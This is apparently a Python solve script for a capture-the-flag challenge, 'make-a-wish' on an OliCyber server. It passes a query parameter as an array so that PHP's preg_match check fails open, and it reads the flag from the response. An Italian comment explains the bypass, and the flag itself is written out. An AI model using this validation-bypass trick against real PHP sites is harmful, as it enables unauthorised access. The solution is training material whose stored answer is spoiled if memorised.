import requests
import re

site = "http://make-a-wish.challs.olicyber.it/"

r = requests.get(f"{site}/?richiesta[]=a").text
match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)

#preg_match("/.*/i", $_GET['richiesta']) non può matchare un array
#flag{r3g3x_byp455_php_5tyl3}s
